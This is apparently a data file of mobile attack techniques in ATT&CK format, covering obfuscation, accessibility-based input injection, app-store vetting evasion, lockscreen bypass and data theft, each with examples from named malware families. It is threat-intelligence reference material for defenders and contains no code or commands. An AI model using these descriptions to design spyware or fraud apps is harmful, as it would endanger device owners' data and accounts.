T1420,File and Directory Discovery,"Adversaries may enumerate files and directories or search in specific device locations for desired information within a filesystem. Adversaries may use the information from [File and Directory Discovery] during automated discovery to shape follow-on behaviors, including deciding if the adversary should fully infect the target and/or attempt specific actions.   On Android, Linux file permissions and SELinux policies typically stringently restrict what can be accessed by apps without taking advantage of a privilege escalation exploit. The contents of the external storage directory are generally visible, which could present concerns if sensitive data is inappropriately stored there. iOS's security architecture generally restricts the ability to perform any type of [File and Directory Discovery] without use of escalated privileges. ","['[GoldenEagle] has looked for .doc, .txt, .gif, .apk, .jpg, .png, .mp3, and .db files on external storage.', '[Desert Scorpion] can list files stored on external storage.', '[Windshift] has included file enumeration in the malicious apps deployed as part of Operation BULL and Operation ROCK.', '[SilkBean] can get file lists on the SD card.', '[Hornbill] has a list of file extensions that it may use to log certain operations (creation, open, close, modification, movement, deletion) on files of those types.', 'During [Operation Dust Storm] the threat actors used Android backdoors capable of enumerating specific files on the infected devices.', '[Golden Cup] can collect a directory listing of external storage.', '[FrozenCell] has searched for pdf, doc, docx, ppt, pptx, xls, and xlsx file types for exfiltration.', '[Tiktok Pro] can list all hidden files in the `/DCIM/.dat/` directory.', '[CarbonSteal] has searched device storage for various files, including .amr files (audio recordings) and superuser binaries.', '[Escobar] can access external storage.', '[DoubleAgent] has searched for specific existing data directories, including the Gmail app, Dropbox app, Pictures, and thumbnails.']",False
T1406,Obfuscated Files or Information,"Adversaries may attempt to make a payload or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the device or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.    Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Portions of files can also be encoded to hide the plaintext strings that would otherwise help defenders with discovery. Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. ","['[TERRACOTTA] has stored encoded strings.', '[AbstractEmu] has encoded files, such as exploit binaries, to potentially use during and after the rooting process.', '[Gustuff] obfuscated command information using a custom base85-based encoding.', '[Monokle] uses XOR to obfuscate its second stage binary.', '[AndroidOS/MalLocker.B] has employed both name mangling and meaningless variable names in source. [AndroidOS/MalLocker.B] has stored encrypted payload code in the Assets directory, coupled with a custom decryption routine that assembles a .dex file by passing data through Android Intent objects. ', '[SilkBean] has hidden malicious functionality in a second stage file and has encrypted C2 server information.', '[Bread] uses various tricks to obfuscate its strings including standard and custom encryption, programmatically building strings at runtime, and splitting unencrypted strings with repeated delimiters to break up keywords. [Bread] has also abused Java and JavaScript features to obfuscate code. [Bread] payloads have hidden code in native libraries and encrypted JAR files in the data section of an ELF file. [Bread] has stored DEX payloads as base64-encoded strings in the Android manifest and internal Java classes.', '[INSOMNIA] obfuscates various pieces of information within the application. ', '[Pallas] stores domain information and URL paths as hardcoded AES-encrypted, base64-encoded strings.', '[Cerberus] uses standard payload and string obfuscation techniques.', '[TianySpy] has encrypted C2 details, email addresses, and passwords. ', '[Asacub] has stored encrypted strings in the APK file.', '[FluBot] can obfuscated class, string, and method names in newer malware versions.', '[HenBox] has obfuscated components using XOR, ZIP with a single-byte key or ZIP/Zlib compression wrapped with RC4 encryption.', '[GolfSpy] encodes its configurations using a customized algorithm.', '[CHEMISTGAMES] has encrypted its DEX payload.', '[FakeSpy] stores its malicious code in encrypted asset files that are decrypted at runtime. Newer versions of [FakeSpy] encrypt the C2 address.', '[BrainTest] stores a secondary Android app package (APK) in its assets directory in encrypted form, and decrypts the payload at runtime.', '[Drinik] has used custom encryption to hide strings, potentially to evade antivirus products.', '[Mandrake] obfuscates its hardcoded C2 URLs.', '[WolfRAT] code is obfuscated.', '[Zen] base64 encodes one of the strings it searches for.', '[Android/AdDisplay.Ashas] has hidden the C2 server address using base-64 encoding. ', '[FlexiSpy] encrypts its configuration file using AES.', '[GPlayed] has base64-encoded the exfiltrated data, replacing some of the base64 characters to further obfuscate the data.', '[XLoader for Android] loads an encrypted DEX code payload.', '[SharkBot] can use a Domain Generation Algorithm to decode the C2 server location. ', 'Starting in 2017, the [Rotexy] DEX file was packed with garbage strings and/or operations.', '[WireLurker] obfuscates its payload through complex code structure, multiple component versions, file hiding, code obfuscation and customized encryption to thwart anti-reversing.', '[OBAD] contains encrypted code along with an obfuscated decryption routine to make it difficult to analyze.', '[Red Alert 2.0] has stored data embedded in the strings.xml resource file.', '[EventBot] dynamically loads its malicious functionality at runtime from an RC4-encrypted TTF file. [EventBot] also utilizes ProGuard to obfuscate the generated APK file.', '[Charger] encodes strings into binary arrays to make it difficult to inspect them. It also loads code from encrypted resources dynamically and includes meaningless commands that mask the actual commands passing through.', '[DoubleAgent] has used an AES encrypted file in the assets folder with an unsuspecting name (e.g. ‘GoogleMusic.png’) for holding configuration and C2 information.', '[Windshift] has encrypted application strings using AES in ECB mode and Blowfish, and stored strings encoded in hex during Operation BULL. Further, in Operation BULL, encryption keys were stored within the application’s launcher icon file.', '[CarbonSteal] has used incorrect file extensions and encryption to hide most of its assets, including secondary APKs, configuration files, and JAR or DEX files.', '[Dvmap] decrypts executables from archive files stored in the `assets` directory of the installation binary.', '[Ginp] obfuscates its payload, code, and strings.', '[TrickMo] contains obfuscated function, class, and variable names, and encrypts its shared preferences using Java’s `PBEWithMD5AndDES` algorithm.', '[RedDrop] contains malicious embedded files, which are compiled to initiate the malicious functionality.']",False
T1516,Input Injection,"A malicious application can inject input to the user interface to mimic user interaction through the abuse of Android's accessibility APIs.  [Input Injection] can be achieved using any of the following methods:  * Mimicking user clicks on the screen, for example to steal money from a user's PayPal account. * Injecting global actions, such as `GLOBAL_ACTION_BACK` (programatically mimicking a physical back button press), to trigger actions on behalf of the user. * Inserting input into text fields on behalf of the user. This method is used legitimately to auto-fill text fields by applications such as password managers.","['[S.O.V.A.] can programmatically tap the screen or swipe.', '[DEFENSOR ID] can abuse the accessibility service to perform actions on behalf of the user, including launching attacker-specified applications to steal data.', ' [Ginp] can inject input to make itself the default SMS handler. ', '[TERRACOTTA] can inject clicks to launch applications, share posts on social media, and interact with WebViews to perform fraudulent actions.', '[SharkBot] can use input injection via Accessibility Services to simulate user touch inputs, prevent applications from opening, change device settings, and bypass MFA protections.', '[TrickMo] can inject input to set itself as the default SMS handler, and to automatically click through pop-ups without giving the user any time to react.', '[Mandrake] abuses the accessibility service to prevent removing administrator permissions, accessibility permissions, and to set itself as the default SMS handler.', '[Zen] can simulate user clicks on ads and system prompts to create new Google accounts.', '[Gustuff] injects the global action `GLOBAL_ACTION_BACK` to mimic pressing the back button to close the application if a call to an open antivirus application is detected.', '[Riltok] injects input to set itself as the default SMS handler by clicking the appropriate places on the screen. It can also close or minimize targeted antivirus applications and the device security settings screen.', '[Cerberus] can inject input to grant itself additional permissions without user interaction and to prevent application removal.']",False
T1464,Network Denial of Service,"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth that services rely on, or by jamming the signal going to or coming from devices.   A Network DoS will occur when an adversary is able to jam radio signals (e.g. Wi-Fi, cellular, GPS) around a device to prevent it from communicating. For example, to jam cellular signal, an adversary may use a handheld signal jammer, which jam devices within the jammer’s operational range.   Usage of cellular jamming has been documented in several arrests reported in the news.",['[S.O.V.A.] has C2 commands to add an infected device to a DDoS pool.'],False
T1577,Compromise Application Executable,"Adversaries may modify applications installed on a device to establish persistent access to a victim. These malicious modifications can be used to make legitimate applications carry out adversary tasks when these applications are in use.  There are multiple ways an adversary can inject malicious code into applications. One method is by taking advantages of device vulnerabilities, the most well-known being Janus, an Android vulnerability that allows adversaries to add extra bytes to APK (application) and DEX (executable) files without affecting the file's signature. By being able to add arbitrary bytes to valid applications, attackers can seamlessly inject code into genuine executables without the user's knowledge.  Adversaries may also rebuild applications to include malicious modifications. This can be achieved by decompiling the genuine application, merging it with the malicious code, and recompiling it.  Adversaries may also take action to conceal modifications to application executables and bypass user consent. These actions include altering modifications to appear as an update or exploiting vulnerabilities that allow activities of the malicious application to run inside a system application.","['[YiSpecter] has replaced device apps with ones it has downloaded.', '[BOULDSPY] can inject malicious packages into applications already existing on an infected device.', '[Agent Smith] can inject fraudulent ad modules into existing applications on a device.']",
T1624,Event Triggered Execution,"Adversaries may establish persistence using system mechanisms that trigger execution based on specific events. Mobile operating systems have means to subscribe to events such as receiving an SMS message, device boot completion, or other device activities.   Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via automatically and repeatedly executing malicious code. After gaining access to a victim’s system, adversaries may create or modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked. ",['[BOULDSPY] uses a background service that can restart itself when the parent activity is stopped.     '],False
T1422,System Network Configuration Discovery,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of operating systems they access or through information discovery of remote systems.      On Android, details of onboard network interfaces are accessible to apps through the `java.net.NetworkInterface` class. Previously, the Android `TelephonyManager` class could be used to gather telephony-related device identifiers, information such as the IMSI, IMEI, and phone number. However, starting with Android 10, only preloaded, carrier, the default SMS, or device and profile owner applications can access the telephony-related device identifiers.      On iOS, gathering network configuration information is not possible without root access.      Adversaries may use the information from [System Network Configuration Discovery] during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ","['[FakeSpy] can collect device networking information, including phone number, IMEI, and IMSI.', '[Sunbird] can exfiltrate phone number and IMEI.', ""[Riltok] can query the device's IMEI."", ""[Hornbill] can collect a device's phone number and IMEI, and can check to see if WiFi is enabled."", '[TrickMo] can collect device network configuration information such as IMSI, IMEI, and Wi-Fi connection state.', '[AbstractEmu] can collect device IP address and SIM information.', '[WolfRAT] sends the device’s IMEI with each exfiltration request.', '[YiSpecter] has collected compromised device MAC addresses.', '[RuMMS] gathers the device phone number and IMEI and transmits them to a command and control server.', '[XLoader for iOS] can obtain the device’s IMEM, ICCID, and MEID.', '[Tangelo] contains functionality to gather cellular IDs.', '[EventBot] can gather device network information. ', '[BOULDSPY] can collect network information, such as IP address, SIM card info, and Wi-Fi info.', '[GPlayed] can collect the device’s IMEI, phone number, and country.', '[Golden Cup] can collect the device’s phone number and IMSI.', '[FrozenCell] has collected phone metadata such as cell location, mobile country code (MCC), and mobile network code (MNC).', '[INSOMNIA] can collect the device’s phone number, ICCID, IMEI, and the currently active network interface (Wi-Fi or cellular).', '[DualToy] collects the connected iOS device’s information including IMEI, IMSI, ICCID, serial number and phone number.', '[Asacub] can collect various pieces of device network configuration information, such as mobile network operator.', ""[PJApps] has the capability to collect and leak the victim's phone number, mobile device unique identifier (IMEI)."", ' [Exodus] One queries the device for its IMEI code and the phone number in order to validate the target of a new infection. ', '[Bread] collects the device’s IMEI, carrier, mobile country code, and mobile network code.', '[CarbonSteal] has collected device network information, including 16-bit GSM Cell Identity, 16-bit Location Area Code, Mobile Country Code (MCC), and Mobile Network Code (MNC). [CarbonSteal] has also called `netcfg` to get stats.', ' [ANDROIDOS_ANSERVER.A] gathers the device IMEI and IMSI.', '[Monokle] checks if the device is connected via Wi-Fi or mobile data.', '[Gustuff] gathers the device IMEI to send to the command and control server.', '[Corona Updates] can collect device network configuration information, such as Wi-Fi SSID and IMSI.', '[Stealth Mango] collects and uploads information about changes in SIM card or phone numbers on the device.', '[ViperRAT] can collect network configuration data from the device, including phone number, SIM operator, and network operator.', '[Exobot] can obtain the device’s IMEI, phone number, and IP address. ', '[RedDrop] collects and exfiltrates information including IMEI, IMSI, MNC, MCC, nearby Wi-Fi networks, and other device and SIM-related info.', ""[Rotexy] collects the device's IMEI and sends it to the command and control server."", '[TERRACOTTA] has collected the device’s phone number and can check if the active network connection is metered.', '[Pegasus for Android] checks if the device is on Wi-Fi, a cellular network, and is roaming.', '[TianySpy] can check to see if WiFi is enabled. ', '[SpyDealer] harvests the device phone number, IMEI, and IMSI.', '[XLoader for Android] collects the device’s IMSI and ICCID.', '[FlyTrap] can collect IP address and network configuration information.']",False
T1463,Manipulate Device Communication,"If network traffic between the mobile device and a remote server is not securely protected, then an attacker positioned on the network may be able to manipulate network communication without being detected. For example, FireEye researchers found in 2014 that 68% of the top 1,000 free applications in the Google Play Store had at least one Transport Layer Security (TLS) implementation vulnerability potentially opening the applications' network traffic to adversary-in-the-middle attacks .",[],True
T1512,Video Capture,"An adversary can leverage a device’s cameras to gather information by capturing video recordings. Images may also be captured, potentially in specified intervals, in lieu of video files.       Malware or scripts may interact with the device cameras through an available API provided by the operating system. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture] due to use of the device’s cameras for video recording rather than capturing the victim’s screen.      In Android, an application must hold the `android.permission.CAMERA` permission to access the cameras. In iOS, applications must include the `NSCameraUsageDescription` key in the `Info.plist` file. In both cases, the user must grant permission to the requesting application to use the camera. If the device has been rooted or jailbroken, an adversary may be able to access the camera without knowledge of the user.  ","['[Stealth Mango] can record and take pictures using the front and back cameras.', '[GolfSpy] can record video.', '[TangleBot] can record video from the device camera.', '[Monokle] can take photos and videos.', '[Escobar] can take photos using the device cameras.', '[Fakecalls] can request camera permissions.', '[WolfRAT] can take photos and videos.', '[Golden Cup] can take pictures with the camera.', '[Windshift] has included video recording in the malicious apps deployed as part of Operation BULL.', '[Skygofree] can record video or capture photos when an infected device is in a specified location.', '[ViperRAT] can take photos with the device camera.', ' [Exodus] Two can take pictures with the device cameras. ', '[DroidJack] can capture video using device cameras.', '[Corona Updates] can take pictures using the camera and can record MP4 files.', '[SilkBean] can access the camera on the device.', '[GoldenEagle] has taken photos with the device camera.', '[Concipit1248] requests permissions to use the device camera.', '[Desert Scorpion] can record videos.', '[BusyGasper] can record from the device’s camera.', '[AbstractEmu] can grant itself camera permissions.', '[HenBox] can access the device’s camera.', '[FlexiSpy] can record video.', '[Pegasus for Android] has the ability to take pictures using the device camera.', '[BOULDSPY] can take photos using the device cameras.', '[ViceLeaker] can take photos from both the front and back cameras.', '[RCSAndroid] can capture photos using the front and back cameras.', '[Sunbird] can access a device’s camera and take photos.', '[Dendroid] can take photos and record videos.', '[Pallas] can take pictures with both the front and rear-facing cameras.', '[Tiktok Pro] can capture photos and videos from the device’s camera.', '[Hornbill] can access a device’s camera and take photos.', '[SpyDealer] can record video and take photos via front and rear cameras.', '[Dendroid] can take pictures using the phone’s camera as well as record video.']",False
T1475,Deliver Malicious App via Authorized App Store,"Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. Mobile devices often are configured to allow application installation only from an authorized app store (e.g., Google Play Store or Apple App Store). An adversary may seek to place a malicious application in an authorized app store, enabling the application to be installed onto targeted devices.  App stores typically require developer registration and use vetting techniques to identify malicious applications. Adversaries may use these techniques against app store defenses:  * [Download New Code at Runtime] * [Obfuscated Files or Information]  Adversaries may also seek to evade vetting by placing code in a malicious application to detect whether it is running in an app analysis environment and, if so, avoid performing malicious actions while under analysis.      Adversaries may also use fake identities, payment cards, etc., to create developer accounts to publish malicious applications to app stores.   Adversaries may also use control of a target's Google account to use the Google Play Store's remote installation capability to install apps onto the Android devices associated with the Google account.   (Only applications that are available for download through the Google Play Store can be remotely installed using this technique.)","['[eSurv] Android version was available in the Google Play Store.', '[SimBad] was distributed via the Google Play Store.', '[Dvmap] was delivered via the Google Play Store. It evaded Google Play Store checks by uploading a clean application, and replacing it with a malicious version for a short period of time. This occurred at least 5 times in a one month period.', '[Mandrake] has had the first stage (dropper) distributed via the Google Play Store.', '[DEFENSOR ID] was delivered via the Google Play Store.', '[Dendroid] has been distributed via the Google Play Store.', '[Zen] has been distributed via the Google Play Store.', '[Android/AdDisplay.Ashas] has been identified in 42 apps in the Google Play Store.', '[CHEMISTGAMES] has been distributed via the Google Play Store.', '[Corona Updates] has been distributed through the Play Store.', '[Desert Scorpion] has been distributed via the Google Play Store.', '[Pegasus for Android] attempts to detect whether it is running in an emulator rather than a real device.', '[Anubis] has been delivered via the Google Play Store.', ' [Exodus] One has been distributed via the Play Store. ', '[Golden Cup] has been distributed via the Google Play Store.', ' [Bread] has been distributed through the Play Store. Some versions started off as clean to build a userbase and developer reputation. These versions were then updated to introduce malicious code. ', '[Windshift] has distributed malicious apps via the Google Play Store and Apple App Store.', 'Early [Triada] variants were delivered through trojanized apps that were distributed via the Play Store. ', '[Concipit1248] has been distributed through the App Store.', ""[ZergHelper] apparently evaded Apple's app review process by performing different behaviors for users from different physical locations (e.g. performing differently for users in China versus outside of China), which could have bypassed the review process depending on the country from which it was performed.""]",False
T1471,Data Encrypted for Impact,An adversary may encrypt files stored on a mobile device to prevent the user from accessing them. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.,"[""[Xbot] can encrypt the victim's files in external storage (e.g., SD card) and then request a PayPal cash card as ransom."", '[Anubis] can use its ransomware module to encrypt device data and hold it for ransom.', '[S.O.V.A.] has code to encrypt device data with AES.']",False
T1421,System Network Connections Discovery,"Adversaries may attempt to get a listing of network connections to or from the compromised device they are currently accessing or from remote systems by querying for information over the network.      This is typically accomplished by utilizing device APIs to collect information about nearby networks, such as Wi-Fi, Bluetooth, and cellular tower connections. On Android, this can be done by querying the respective APIs:      * `WifiInfo` for information about the current Wi-Fi connection, as well as nearby Wi-Fi networks. Querying the `WiFiInfo` API requires the application to hold the `ACCESS_FINE_LOCATION` permission.   * `BluetoothAdapter` for information about Bluetooth devices, which also requires the application to hold several permissions granted by the user at runtime.   * For Android versions prior to Q, applications can use the `TelephonyManager.getNeighboringCellInfo()` method. For Q and later, applications can use the `TelephonyManager.getAllCellInfo()` method. Both methods require the application hold the `ACCESS_FINE_LOCATION` permission.","['[Monokle] can retrieve nearby cell tower and Wi-Fi network information.', '[FlexiSpy] can collect a list of known Wi-Fi access points. ', '[Pegasus for iOS] monitors the connection state and tracks which types of networks the phone is connected to, potentially to determine the bandwidth and ability to send full data across the network.', '[Pallas] gathers and exfiltrates data about nearby Wi-Fi access points.', '[FakeSpy] can collect the device’s network information.', '[Exodus] Two collects a list of nearby base stations. ', '[ViperRAT] can collect the device’s cell tower information.']",False
T1660,Phishing,"Adversaries may send malicious content to users in order to gain access to their mobile devices. All forms of phishing are electronically delivered social engineering. Adversaries can conduct both non-targeted phishing, such as in mass malware spam campaigns, as well as more targeted phishing tailored for a specific individual, company, or industry, known as “spearphishing”.  Phishing often involves social engineering techniques, such as posing as a trusted source, as well as evasion techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages.  Mobile phishing may take various forms. For example, adversaries may send emails containing malicious attachments or links, typically to deliver and then execute malicious code on victim devices. Phishing may also be conducted via third-party services, like social media platforms.    Mobile devices are a particularly attractive target for adversaries executing phishing campaigns.  Due to their smaller form factor than traditional desktop endpoints, users may not be able to notice minor differences between genuine and phishing websites. Further, mobile devices have additional sensors and radios that allow adversaries to execute phishing attempts over several different vectors, such as:   - SMS messages: Adversaries may send SMS messages (known as “smishing”) from compromised devices to potential targets to convince the target to, for example, install malware, navigate to a specific website, or enable certain insecure configurations on their device. - Quick Response (QR) Codes: Adversaries may use QR codes (known as “quishing”) to redirect users to a phishing website. For example, an adversary could replace a legitimate public QR Code with one that leads to a different destination, such as a phishing website. A malicious QR code could also be delivered via other means, such as SMS or email. In the latter case, an adversary could utilize a malicious QR code in an email to pivot from the user’s desktop computer to their mobile device. - Phone Calls: Adversaries may call victims (known as “vishing”) to persuade them to perform an action, such as providing login credentials or navigating to a malicious website. This could also be used as a technique to perform the initial access on a mobile device, but then pivot to a computer/other network by having the victim perform an action on a desktop computer. ",[],False
T1461,Lockscreen Bypass,"An adversary with physical access to a mobile device may seek to bypass the device’s lockscreen. Several methods exist to accomplish this, including:  * Biometric spoofing: If biometric authentication is used, an adversary could attempt to spoof a mobile device’s biometric authentication mechanism. Both iOS and Android partly mitigate this attack by requiring the device’s passcode rather than biometrics to unlock the device after every device restart, and after a set or random amount of time. * Unlock code bypass: An adversary could attempt to brute-force or otherwise guess the lockscreen passcode (typically a PIN or password), including physically observing (“shoulder surfing”) the device owner’s use of the lockscreen passcode. Mobile OS vendors partly mitigate this by implementing incremental backoff timers after a set number of failed unlock attempts, as well as a configurable full device wipe after several failed unlock attempts. * Vulnerability exploit: Techniques have been periodically demonstrated that exploit mobile devices to bypass the lockscreen. The vulnerabilities are generally patched by the device or OS vendor once disclosed. ",['[Escobar] can request the `DISABLE_KEYGUARD` permission to disable the device lock screen password.'],False
T1605,Command-Line Interface,"Adversaries may use built-in command-line interfaces to interact with the device and execute commands. Android provides a bash shell that can be interacted with over the Android Debug Bridge (ADB) or programmatically using Java’s `Runtime` package. On iOS, adversaries can interact with the underlying runtime shell if the device has been jailbroken.  If the device has been rooted or jailbroken, adversaries may locate and invoke a superuser binary to elevate their privileges and interact with the system as the root user. This dangerous level of permissions allows the adversary to run special commands and modify protected system files.",[],True
T1533,Data from Local System,"Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to exfiltration.       Access to local system data, which includes information stored by the operating system, often requires escalated privileges. Examples of local system data include authentication tokens, the device keyboard cache, Wi-Fi passwords, and photos. On Android, adversaries may also attempt to access files from external storage which may require additional storage-related permissions.    ","['[Fakecalls] can access and exfiltrate files, such as photos or video.', '[BusyGasper] can collect images stored on the device and browser history.', '[Chameleon] can gather cookies and device logs. ', '[Anubis] can exfiltrate files encrypted with the ransomware module from the device and can modify external storage. ', ' [Gustuff] can capture files and photos from the compromised device. ', '[FrozenCell] has retrieved device images for exfiltration.', '[Windshift] has exfiltrated local account data and calendar information as part of Operation ROCK.', '[TangleBot] can request permission to view files and media.', 'During [Operation Dust Storm] the threat actors used Android backdoors capable of exfiltrating specific files directly from the infected devices.', '[Sunbird] can access images stored on external storage.', '[Corona Updates] can collect voice notes, device accounts, and gallery images.', '[Monokle] can retrieve the salt used when storing the user’s password, aiding an adversary in computing the user’s plaintext password/PIN from the stored password hash. [Monokle] can also capture the user’s dictionary, user-defined shortcuts, and browser history, enabling profiling of the user and their activities.', '[DoubleAgent] has collected files from the infected device.\t', '[GolfSpy] can collect local accounts on the device, pictures, bookmarks/histories of the default browser, and files stored on the SD card. [GolfSpy] can list image, audio, video, and other files stored on the device. [GolfSpy] can copy arbitrary files from the device.', '[eSurv] can exfiltrate device pictures.', '[Dendroid] can collect the device’s photos, browser history, bookmarks, and accounts stored on the device.', '[WolfRAT] can collect user account, photos, browser history, and arbitrary files.', '[Desert Scorpion] can collect attacker-specified files, including files located on external storage.\t', '[FlexiSpy] can monitor device photos and can also access browser history and bookmarks.', '[Golden Cup] can collect images, videos, and attacker-specified files.', '[BOULDSPY] can access browser history and bookmarks, and can list all files and folders on the device.', '[HenBox] can steal data from various sources, including chat, communication, and social media apps.', '[Concipit1248] can collect device photos.', '[CHEMISTGAMES] can collect files from the filesystem and account information from Google Chrome.', '[Drinik] can request the `READ_EXTERNAL_STORAGE` and `WRITE_EXTERNAL_STORAGE` Android permissions.', '[Hornbill] can access images stored on external storage.', '[Gooligan] steals authentication tokens that can be used to access data from multiple Google applications.', '[RCSAndroid] can collect passwords for Wi-Fi networks and online accounts, including Skype, Facebook, Twitter, Google, WhatsApp, Mail, and LinkedIn.', '[AbstractEmu] can collect files from or inspect the device’s filesystem.', '[Tiktok Pro] can collect device photos and credentials from other applications.', '[INSOMNIA] can collect application database files, including Gmail, Hangouts, device photos, and container directories of third-party apps.', '[SpyNote RAT] can copy files from the device to the C2 server.', '[Tangelo] accesses browser history, pictures, and videos.', '[ViperRAT] can collect device photos, PDF documents, Office documents, browser history, and browser bookmarks.', '[GPlayed] can collect the user’s browser cookies.', '[TrickMo] can steal pictures from the device.', '[Escobar] can collect sensitive information, such as Google Authenticator codes.', '[ViceLeaker] can copy arbitrary files from the device to the C2 server, can exfiltrate browsing history, can exfiltrate the SD card structure, and can exfiltrate pictures as the user takes them.', ""[Exodus] Two can extract information on pictures from the Gallery, Chrome and SBrowser bookmarks, and the connected WiFi network's password."", ' [Ginp] can download device logs. ', '[SilkBean] can retrieve files from external storage and can collect browser data.', '[GoldenEagle] has retrieved .doc, .txt, .gif, .apk, .jpg, .png, .mp3, and .db files from external storage.', '[Stealth Mango] collected and exfiltrated data from the device, including sensitive letters/documents, stored photos, and stored audio files.']",False
T1640,Account Access Removal,"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: credentials changed) to remove access to accounts. ","[""[Monokle] can reset the user's password/PIN.""]",False
T1426,System Information Discovery,"Adversaries may attempt to get detailed information about a device’s operating system and hardware, including versions, patches, and architecture. Adversaries may use the information from [System Information Discovery] during automated discovery to shape follow-on behaviors, including whether or not to fully infects the target and/or attempts specific actions.      On Android, much of this information is programmatically accessible to applications through the `android.os.Build` class.  iOS is much more restrictive with what information is visible to applications. Typically, applications will only be able to query the device model and which version of iOS it is running. ","['[XLoader for Android] collects the device’s Android ID and serial number.', ""Most [KeyRaider] samples search to find the Apple account's username, password and device's GUID in data being transferred."", '[Chameleon] can gather basic device information such as version, model, root status, and country.', '[Golden Cup] can collect various pieces of device information, such as serial number and product information.', '[INSOMNIA] can collect the device’s name, serial number, iOS version, total disk space, and free disk space. ', '[CHEMISTGAMES] has fingerprinted devices to uniquely identify them.', '[Android/AdDisplay.Ashas] can collect information about the device including device type, OS version, language, free storage space, battery status, device root, and if *developer mode* is enabled.', '[ViceLeaker] collects device information, including the device model and OS version.', '[XLoader for iOS] can obtain the device’s UDID, version number, and product number.', '[Asacub] can collect various pieces of device information, including device model and OS version.', '[TianySpy] can gather device UDIDs. ', '[eSurv] iOS version can collect device information.', '[Anubis] can collect the device’s ID.', '[Hornbill] can collect the device ID, model, manufacturer, and Android version. It can also check available storage space and if the screen is locked.', '[S.O.V.A.] can gather data about the device.', '[Sunbird] can exfiltrate the victim device ID, model, manufacturer, and Android version.', '[ViperRAT] can collect system information, including brand, manufacturer, and serial number.', '[Windshift] has included system information enumeration in the malicious apps deployed as part of Operation BULL and Operation ROCK.', '[Desert Scorpion] can collect device metadata and can check if the device is rooted.', '[Dvmap] checks the Android version to determine which system library to patch.', '[CarbonSteal] has gathered device metadata, including model, manufacturer, SD card size, disk usage, memory, CPU, and serial number.', '[Pegasus for iOS] monitors the victim for status and disables other access to the phone by other jailbreaking software.', '[Riltok] can query various details about the device, including phone number, country, mobile operator, model, root availability, and operating system version.', '[Android/Chuli.A] gathered system information including phone number, OS version, phone model, and SDK version.', '[FakeSpy] can collect device information, including OS version and device model.', '[Tiktok Pro] can check the device’s battery status.', '[EventBot] can collect system information such as OS version, device vendor, and the type of screen lock that is active on the device.', '[Pallas] queries the device for metadata, such as device ID, OS version, and the number of cameras.', '[TrickMo] can collect device information such as network operator, model, brand, and OS version.', '[HenBox] can collect device information and can check if the device is running MIUI on a Xiaomi device.', '[BOULDSPY] can collect system information, such as Android version and device identifiers.', '[AbstractEmu] can collect device information such as manufacturer, model, version, serial number, and telephone number.', '[ANDROIDOS_ANSERVER.A] gathers the device OS version, device build version, manufacturer, and model.', '[Gustuff] gathers information about the device, including the default SMS application, if SafetyNet is enabled, the battery level, the operating system version, and if the malware has elevated permissions.', '[Cerberus] can collect device information, such as the default SMS app and device locale.', '[Corona Updates] can collect various pieces of device information, including OS version, phone model, and manufacturer. ', '[GoldenEagle] has checked for system root.', '[RuMMS] gathers device model and operating system version information and transmits it to a command and control server.', '[GPlayed] can collect the device’s model, country, and Android version.', '[Monokle] queries the device for metadata such as make, model, and power levels.', '[FrozenCell] has gathered the device manufacturer, model, and serial number.', '[GolfSpy] can obtain the device’s battery level, network operator, connection information, sensor information, and information about the device’s storage and memory.', '[Exobot] can obtain the device’s country and carrier name.', '[RedDrop] exfiltrates details of the victim device operating system and manufacturer.', '[Mandrake] can access device configuration information and status, including Android version, battery level, device model, country, and SIM operator.', '[Rotexy] collects information about the compromised device, including phone number, network operator, OS version, device model, and the device registration country.', '[DoubleAgent] has accessed common system information.', '[YiSpecter] has collected the device UUID.']",False
T1442,Fake Developer Accounts,,[],True
T1510,Clipboard Modification,"Adversaries may abuse clipboard functionality to intercept and replace information in the Android device clipboard. Malicious applications may monitor the clipboard activity through the <code>ClipboardManager.OnPrimaryClipChangedListener</code> interface on Android to determine when the clipboard contents have changed. Listening to clipboard activity, reading the clipboard contents, and modifying the clipboard contents requires no explicit application permissions and can be performed by applications running in the background, however, this behavior has changed with the release of Android 10.  Adversaries may use [Clipboard Modification] to replace text prior to being pasted, for example, replacing a copied Bitcoin wallet address with a wallet address that is under adversarial control.  [Clipboard Modification] had been seen within the Android/Clipper.C trojan. This sample had been detected by ESET in an application distributed through the Google Play Store targeting cryptocurrency wallet numbers.",[],True
T1532,Archive Collected Data,"Adversaries may compress and/or encrypt data that is collected prior to exfiltration. Compressing data can help to obfuscate its contents and minimize use of network resources. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.      Both compression and encryption are done prior to exfiltration, and can be performed using a utility, programming library, or custom algorithm.  ","['[Desert Scorpion] can encrypt exfiltrated data.', '[Exodus] One encrypts data using XOR prior to exfiltration. ', '[BOULDSPY] can encrypt its data before exfiltration.', '[Anubis] exfiltrates data encrypted (with RC4) by its ransomware module.', '[Triada] encrypts data prior to exfiltration. ', '[Golden Cup] has encrypted exfiltrated data using AES in ECB mode.', '[Sunbird] can exfiltrate collected data as a ZIP file.', '[FrozenCell] has compressed and encrypted data before exfiltration using password protected .7z archives.', '[Asacub] has encrypted C2 communications using Base64-encoded RC4.', '[GolfSpy] encrypts data using a simple XOR operation with a pre-configured key prior to exfiltration.']",False
T1507,Network Information Discovery,"Adversaries may use device sensors to collect information about nearby networks, such as Wi-Fi and Bluetooth.",[],True
